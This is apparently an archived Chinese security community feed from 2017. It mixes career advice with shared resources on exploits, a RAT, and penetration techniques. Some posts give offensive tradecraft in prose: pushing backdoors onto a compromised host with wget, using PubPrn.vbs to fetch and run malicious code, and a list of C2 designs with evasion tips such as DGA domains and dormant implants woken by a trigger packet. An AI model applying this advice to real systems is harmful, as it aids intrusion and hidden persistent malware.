<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-06:

> 匿名用户 提问：
最近要开始找工作了，研究生一枚，从0开始学习web安全差不多两年多一点，想问问互联网公司，金融行业，创业型公司，以及传统安全厂商，非互联网公司之间如何做出抉择。特别是传统安全厂商，这一两年传统安全厂商感觉面临着不小的挑战。毕竟，这个这个行业可能算是我接下来10多年甚至20年都会做下去的方向，请余弦大大百忙之中能够解惑一下


既然都计划做 10-20 年了，那么乙方（尤其是传统安全厂商）可以待个 3-5 年，甲方大厂的安全部门也可以待个 3-5 年。（不是非得这样）

3-5 年是建议最小的周期，如果这都没待满，那么总会各种原因，首先多看看自己的原因。如果发展好可以继续着，比如我刚本科毕业就进入知道创宇，做了 9 年，今年正式出来，出来时有不少好机会，最终我是选了自己创业这条路。

3-5 一周期（最小周期），很多东西就可以沉淀下来了，不用我说更多。

我需要特别说的一个点是：“如果安全是兴趣，但不一定会成为终身职业。”那么建议，在安全公司或安全部门发展的同时，不要限制了自己的朋友圈，不要有“技术为王”、“黑客最屌”这种思维。

最后，这个安全大生态是包容的，不要听风就是雨，传统安全也好，所谓下一代安全也好，都有自己的生存之道，没谁比谁有优越感。都是聪明人，以我们的努力程度，还不到要比天赋的时候。

所以啊，最终怎么选，不仅看你，还看那些实力团队要不要你，机会来了，把握就是了。



...

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 最近也在思考进入信息安全领域这个问题，余弦大大的建议值得借鉴。😉

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 回答不对题目额

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 不至于我手把手引导吧？聪明人需要自己去按图索骥……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 再说，抉择的事我哪敢帮忙抉择，给出参考，剩下的靠自己

<img src="https://file.xiaomiquan.com/18/07/1807a5f3cc1660fa383120816e5517bd037e67e99ee21661600f00569282a37e.jpg" width="25px"/> __Long__: 自学web安全，看你对攻和防哪方面更感兴趣，如果喜欢攻，则要朝安全研究方向走，如果喜欢防，则可以走安全运营方向，不管哪个方向，都需要关注安全领域前沿的东西，不然，小公司没有安全团队，大公司更喜欢招有业界影响力的牛人。安全水很深，且行且珍惜！

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 讲讲我个人经历吧，可供参考。我没专门做安全类岗位，业余爱好渗透和逆向，做的是web及app开发，毕业后去的360，待了两年，现在百度主要做服务端开发。身边前后认识了很多搞安全的好朋友，可能因为兴趣相投吧。说说安全工作的负面，不是给你泼冷水，想让你看的更客观些：乙方公司我没待过不敢说，甲方公司的安全类岗位最大的难处是收益量化问题，特别像BAT这种地方，一个团队如果无法量化自己的收益产出，那就很难拥有足够的空间去发挥。为什么难量化呢，因为安全这个工作，你做的好 没漏洞了，老板会把你忘了，你做的不好漏洞多了也不行。个人觉得还是攻比较有意思，也是我念大学时会选择去360实习的原因，那边的二进制做的很牛。

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 具体自己怎么规划这个得看自己的具体想法，余弦大大的也只能作为参考，有助于我们学习。

<img src="https://file.xiaomiquan.com/18/07/1807a5f3cc1660fa383120816e5517bd037e67e99ee21661600f00569282a37e.jpg" width="25px"/> __Long__ replies to <img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 👍

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 哈哈我在传统行业，不过爱好安全，但是就是没这方面牛叉的朋友啊，要不余兄请你吃顿小龙虾怎么样？不行两顿😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 好啊

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 会不会为了生存做heichan相关？否则安全这个技能不就废掉了

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 这世上哪有绝对的黑和白，大家不都是灰色的吗😉

<img src="https://file.xiaomiquan.com/0c/a5/0ca53405ff7f48e1d5803414c05b72e5daade600cdc1968252bcf6eb5a35ddd6.jpg" width="25px"/> __懂得__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 和这哥们想一块了，期待余兄传道授业解惑👍

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 来福州，，福州有辣皇朝

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 膜拜大神，在百度工作再加上接点单子，生活可以过得很滋润


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-06:


__#资源#__

  “震网三代”（CVE-2017-8464）的几种利用方法与防范

CVE-2017-8464 的漏洞，本地用户或远程攻击者可以利用该漏洞生成特制的快捷方式，并通过可移动设备或者远程共享的方式导致远程代码执行。


[“震网三代”（CVE-2017-8464）的几种利用方法与防范 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/news/143356.html)

 

这篇总结得挺全了，推荐看看。不过现在再去玩这个，很容易被查杀。

关于这个漏洞更多细节研究可以参考 nixawk 的研究：


[nixawk/labs · GitHub](https://github.com/nixawk/labs/tree/master/CVE-2017-8464)



顺便说下 nixawk，他的其他漏洞研究也值得参考：


[GitHub - nixawk/labs: Vulnerability Labs for security analysis](https://github.com/nixawk/labs)





---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-06:

> dusts 提问：
root shell拿到了,然后msf里用 shell to meterpreter 模块，也总是执行成功，但是就是不能返回 meterpreter  sessions -l永远只是个shell  是什么原因？  有解吗？


linux下root shell那么强大，还要meterpreter shell干嘛，有时候msf加载的模块是会不稳定，如果一定要meterpreter shell，可以手工生成后门执行一下



...

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 想拷贝文件，但是没有nc , 没有能做交互式shell的python，用什么传

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 只是传文件就太多方法了，scp ftp 这些比较简单，对方至少是有scp的，或者wget 你的其它后门进去

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个问题也挺模糊的，该上调试了，看看相关日志

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 非交互式的ftp怎么连法

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 有没有非交互式shell下的操作指南，针对很多需要交互的命令的 非交互写法

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 嗯，msf调试模块没找到。。shell下会打印一堆乱码，可能是antivirus 的缘故

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: echo是可以。但是碰到ftp不支持-s 文件输入

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 非交互的scp怎么传密码进去，看了下参数没有，  要生成密钥对吗？如果密钥对的话简单的生成方法？

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ssh keygen 生成密钥对后，公钥存放位置不明，不同版本密钥保存位置不一样，有点繁琐，有没有直接传密码的非交互方式

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: ssh keygen 生成密钥对后，公钥存放位置不明，不同版本密钥保存位置不一样，有点繁琐，有没有直接传密码的非交互方式

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: echo 个ftp 的脚本，自动下载呢？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#资源#__

  之前提到过这本书《灰帽 C#》，玩 C# 及 Win 渗透的同学，这本书很值得实践，也很值得入门，前提是：英文不是障碍。

由浅入深，一步步打造自己的利用工具，并和那些知名的黑客/安全工具联动。无论是攻还是防，这本书都很合适。

我好像在写书评...🤣


__分享文件:__
[No Starch Press Gray Hat Csharp B0721RCGMX.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/67/5d/675dffcd278b64e6598f07db21ac3da42c6e05137481c473cfb6f7c14f193c75.jpg" width="25px"/> __Sherlock__: 文件打不开

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/67/5d/675dffcd278b64e6598f07db21ac3da42c6e05137481c473cfb6f7c14f193c75.jpg" width="25px"/> __Sherlock__: 可以

<img src="https://file.xiaomiquan.com/25/54/2554db8a586cc8faa9975308b54f5988af68e0b341cb88b77e90e4c05ebeab88.jpg" width="25px"/> __Immortals__: 看到公众号才知道能小密圈终于可以打开了，每天没得内容点击，感觉过了个多月，却还没过几天。

<img src="https://file.xiaomiquan.com/32/3c/323c9df4ddcbf4793ab36832e291f0152cd94181245c43958f190ca74d7098f3.jpg" width="25px"/> __Royal.__: 这本书出多久了呢，怎么还没中文版

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/32/3c/323c9df4ddcbf4793ab36832e291f0152cd94181245c43958f190ca74d7098f3.jpg" width="25px"/> __Royal.__: 近期

<img src="https://file.xiaomiquan.com/3e/bc/3ebce5c2bb67c5ad0ea4e2d0dd0d9b2c60e444bc18d1021d44aea7b315216686.jpg" width="25px"/> __heather__: 好棒！读了50p打算读完的第一本书籍😅

<img src="https://file.xiaomiquan.com/3e/bc/3ebce5c2bb67c5ad0ea4e2d0dd0d9b2c60e444bc18d1021d44aea7b315216686.jpg" width="25px"/> __heather__: Csharpvulnjson的bperry 密码是多少😓找不到


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#姿势#__

  WSH 注入的一个实例：

[WSH Injection: A Case Study – Posts By SpecterOps Team Members](https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd)



这个之前我在本圈子里分享过（白名单 PubPrn.vbs 下载恶意执行），不过估计大多数人都不知道为什么，怎么用。

想知道“为什么”可以看这个实例解析。

至于怎么用，当你需要下载恶意代码动态执行时，PubPrn.vbs 的这个注入机制很棒。

<img src="https://images.xiaomiquan.com/FtKzsYYbF40V-9QvwxD8K6lzsd1j?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:f5zadn-LBMOuhri-YTWEFKMS1G4=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 很强大，文中提到的《Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)》涉及的技巧也很溜，想看中文的旁友可以参考这个： 


[http://www.evil0x.com/posts/21268.html](http://www.evil0x.com/posts/21268.html)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#工具#__

  Burp Suite 1.7.26 发布，其中增加了个先进功能“文件上传漏洞发现”，支持这些格式的嵌入上传：
PDF, SVG, HTML, PHP, SSI.

并且支持外带回显。

Web 黑必备神器，有钱就买吧，没钱就等破解版。


[http://releases.portswigger.net/2017/08/1726.html](http://releases.portswigger.net/2017/08/1726.html)



<img src="https://images.xiaomiquan.com/Fp11Wh8SEBk47NN32yFfqOQCjiKZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:j0zRyAqkqR8_latcqru_yIR-0UA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/d9/83/d983446a8ffcdfd10ba9cdb5b8bcbbfdd420c13f551b433c50505732578f4e6f.jpg" width="25px"/> __冰山。__: 没钱😭


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#姿势#__

  强烈推荐看看这篇 Paper，Koadic (C3) 这个新远控设计思路与功能，这是一款高级 JScript/VBScript 远控，对比了经典的 Meterpreter 和 Empire。最重要的是这个远控是开源的：

[GitHub - zerosum0x0/koadic: Koadic C3 COM Command & Control - JScript RAT](https://github.com/zerosum0x0/koadic)



玩 Win 渗透的同学可以好好看看，其实 Paper 本身简单，工具用起来也简单。


__分享文件:__
[DEFCON25_Koadic C3_COM Command Control.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-04:

Hi. Back!

<img src="https://images.xiaomiquan.com/Fhitq1l4TcD1JqaLY9XT7tJot5oV?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:VgrL7G_qoSO05MjqXFEgdCIM7PA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 饥渴很久了…

<img src="https://file.xiaomiquan.com/50/ed/50ed0e2610af8bbb2d6227844a965b29943973edcbc786b458cd860c6a9f5037.jpg" width="25px"/> __zero__: back

<img src="https://file.xiaomiquan.com/32/13/321380cd79245c1870ee48eb91aa8380d583032cc69f8d13f1700704591de11e.jpg" width="25px"/> __meow__: 哇   终于回归😏

<img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 太好了，期待给力分享

<img src="https://file.xiaomiquan.com/14/0f/140fb95e9c03f1ea592d0b97e3860eebaa2d094c683a2412a5db396e7211c8be.jpg" width="25px"/> __cx__: 艾玛，总于回来了！

<img src="https://file.xiaomiquan.com/89/82/8982e01539e7f5572c5039f03ccf59e4600165deaa00871340d3e2108c8f9238.jpg" width="25px"/> __Ricardo Xu__: 终于回归

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 终于好了😋

<img src="https://file.xiaomiquan.com/97/47/974750d84f30b2b0bee06ac29107f8adbb3e028b3111605175e68bfa1ceadd35.jpg" width="25px"/> __hkurj__: 无聊了好几天了，终于恢复了

<img src="https://file.xiaomiquan.com/d5/4b/d54b4d8e43665176d4e9abbcfae11ddc455a178b2a2e1007397b469116800585.jpg" width="25px"/> __'     小陈__: 总算回来了

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 终于回来了！必须水一贴！😆

<img src="https://file.xiaomiquan.com/67/6d/676dce5cc274939c3aff999a5a33001505c937dcf2325728952b4e67f9efb3e6.jpg" width="25px"/> __KevinShan__: 终于恢复了

<img src="https://file.xiaomiquan.com/b6/53/b653e3522cb1570bb2eb4ff2341a482b5f0a43a183eb85d90fb3fa8bcc113ae7.jpg" width="25px"/> __袁鸣__: 😂 太激动了

<img src="https://file.xiaomiquan.com/3f/55/3f55a881c0f3bf180f35b158719357e46da88c9338ac01cfa75b778deaa6f589.jpg" width="25px"/> __Ares___: 终于回来了

<img src="https://file.xiaomiquan.com/d9/8d/d98d18950409c1a21557e81ea5b11addd5d8e0929702f32011454f6efb1c5892.jpg" width="25px"/> __GEASS__: 终于回来了……

<img src="https://file.xiaomiquan.com/e2/cc/e2cc9141022b937ca894f7d126c0949727ba78c11838cfba6700c5b7641797b5.jpg" width="25px"/> __wanner__ replies to <img src="https://file.xiaomiquan.com/d9/8d/d98d18950409c1a21557e81ea5b11addd5d8e0929702f32011454f6efb1c5892.jpg" width="25px"/> __GEASS__: 回来真好


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-25:

介绍几种cc的设计
1.直接用单一IP地址
好处：简单易用
坏处：容易封禁

2.单一域名
好处：也很简单，被封了再申请一个
坏处：要经常换，免费域名一看就很可疑
例如3322.org

3.多域名+按时更换IP
好处：组合多不大容易被封
坏处：费钱

4.DGA算法
好处：高级CC的主流技术，便宜实用
坏处：随机性字符串域名无法抵御语义分析

5.变形DGA算法
好处：老子再也不怕语义分析啦
坏处：费脑子想个迷惑性强的字典

6.boss+杂兵双层CC
好处：杂兵要多少有多少，每一段时间boss就给派新一批杂兵，找不到boss就很难封锁
坏处：如果boss被抓。。。另外DNS查询量太异常

7.利用论坛发帖，爬取CC指令
好处：隐蔽性好，容易蒙过安全检测人员，尤其是你的指令又很迷惑的情况下
坏处：当论坛版主是个黑客。。。

8.平常无外联，需要时才分配CC
好处：这个厉害了，基本不会被发现
坏处：技术要求高。怎么分配呢？这个见仁见智😝

9.评论区补充



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 哈哈 这个总结厉害

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: dropbox telegram 等都是常用的“中转”

<img src="https://file.xiaomiquan.com/d4/42/d4428c1e7ce108350a3c7564233a4d0b0bee3e8bbc10c0513734a45da30f9a99.jpg" width="25px"/> __大漠__: 麻烦介绍几个代表性cc工具，谢谢分享！

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 还见过新浪博客和QQ空间的

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 第8种没看太懂，求分享细节😆

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 举个例子，你的马平时不主动外连，而是监听某一特定端口，当你要激活它时往这个端口发一个特定内容的包来激活，然后再给它分配一个临时的cc，完事以后解除绑定的cc，继续潜伏😘

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 学习了👍


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-24:


__#经验#__

  R 厉害，Go 也给力，当然 Python 是世界上最好的语言已经不用再啰嗦了...看这篇文章有意思的统计：


[Solidot | Python 是 2017 年第一编程语言](http://www.solidot.org/story?sid=53189)



保值语言 C 家族的必须是，Java 是，JavaScript 也是，如果学了 Python 就没必要去学 Ruby 了，第一直觉是 Ruby 会被竞争下去，特别看好的是 Go 语言，可编译，为并发而生，简直太强悍。如果你非得坚持“PHP 是世界上最好的语言”，我反正笑笑，没什么意见，哪敢有意见呀。

好了，这是我的那么点经验与看法，仅供参考。

<img src="https://images.xiaomiquan.com/FuPfpNE32NGo02cWAfSKfMhGo0tB?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:G1oyODArJUzpjlHPVEt_mSqXjOQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__: 有学python的资源吗。

<img src="https://file.xiaomiquan.com/7b/b5/7bb519709c8a6239e89d7af327b166b96364afdc2a92d1126f7138de7a031387.jpg" width="25px"/> __世界需要咸鱼__ replies to <img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__: 是基础入门么？网上很多资料啊，一搜都有，廖雪峰就挺好的

<img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__ replies to <img src="https://file.xiaomiquan.com/7b/b5/7bb519709c8a6239e89d7af327b166b96364afdc2a92d1126f7138de7a031387.jpg" width="25px"/> __世界需要咸鱼__: 好的。一会我搜搜

<img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__ replies to <img src="https://file.xiaomiquan.com/7b/b5/7bb519709c8a6239e89d7af327b166b96364afdc2a92d1126f7138de7a031387.jpg" width="25px"/> __世界需要咸鱼__: 最近在看i春秋上的。

<img src="https://file.xiaomiquan.com/14/0f/140fb95e9c03f1ea592d0b97e3860eebaa2d094c683a2412a5db396e7211c8be.jpg" width="25px"/> __cx__: 有没好的书推荐一下哈，谢谢

<img src="https://file.xiaomiquan.com/99/28/9928dca1cd305a8a8ebc76bd68148776389c75e13988d5f3c2b2b423001d436a.jpg" width="25px"/> __小胆大叔__: 请问是不是至少要懂一门语言才来这里比较好

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/99/28/9928dca1cd305a8a8ebc76bd68148776389c75e13988d5f3c2b2b423001d436a.jpg" width="25px"/> __小胆大叔__: 原则上是

<img src="https://file.xiaomiquan.com/99/28/9928dca1cd305a8a8ebc76bd68148776389c75e13988d5f3c2b2b423001d436a.jpg" width="25px"/> __小胆大叔__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 谢谢大神

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 补充一下。其实js现在也可以包含pc那个type，因为有了node.js，服务端可以扮演py php等语言的类似角色，桌面pc也可以借助electron或nw.js开发gui。

<img src="https://file.xiaomiquan.com/14/0f/140fb95e9c03f1ea592d0b97e3860eebaa2d094c683a2412a5db396e7211c8be.jpg" width="25px"/> __cx__: 有没好的书推荐一下哈，谢谢

<img src="https://file.xiaomiquan.com/29/43/294342d6718c366ceafc3063d66eeadf020823d4756ef44132a888ef711f7e29.jpg" width="25px"/> __签到啦__: 懂点swift，好肉的感觉


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-23:


__#姿势#__

 Kaspersky Anti-Virus File Server Multiple Vulnerabilities


[Kaspersky Anti-Virus File Server Multiple Vulnerab...](https://www.coresecurity.com/advisories/Kaspersky-Anti-Virus-File-Server-Multiple-Vulnerabilities)



最近很忙，这篇早想分享，忘记了。

